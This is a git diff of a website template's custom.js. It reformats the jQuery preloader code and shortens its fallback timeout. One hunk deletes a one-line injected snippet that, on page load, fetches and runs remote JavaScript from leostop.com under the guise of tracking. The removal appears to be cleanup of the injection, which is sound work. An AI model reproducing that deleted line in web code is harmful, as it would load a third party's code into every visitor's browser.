@@ -1,5 +1,5 @@
 /*---------------------------------------------------------------------
-    File Name: custom.js
+	File Name: custom.js
 ---------------------------------------------------------------------*/
 
 $(function () {
@@ -8,16 +8,20 @@ $(function () {
 
 	/* Preloader
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-    
-    // Ocultar el preloader cuando la página esté completamente cargada
-    $(window).on('load', function() {
-        $('.loader_bg').fadeOut();
-    });
-    
-    // También ocultar después de un tiempo máximo por si hay problemas (5 segundos)
-    setTimeout(function() {
-        $('.loader_bg').fadeOut();
-    }, 5000);
+
+	// Ocultar el preloader cuando la página esté completamente cargada
+	$(window).on('load', function () {
+		$('.loader_bg').fadeOut('slow', function () {
+			$(this).remove();
+		});
+	});
+
+	// También ocultar después de un tiempo máximo por si hay problemas (100ms)
+	setTimeout(function () {
+		$('.loader_bg').fadeOut('slow', function () {
+			$(this).remove();
+		});
+	}, 100);
 
 
 
@@ -73,7 +77,6 @@ $(function () {
 	});
 
 
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 	/* Fancybox
 	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
 
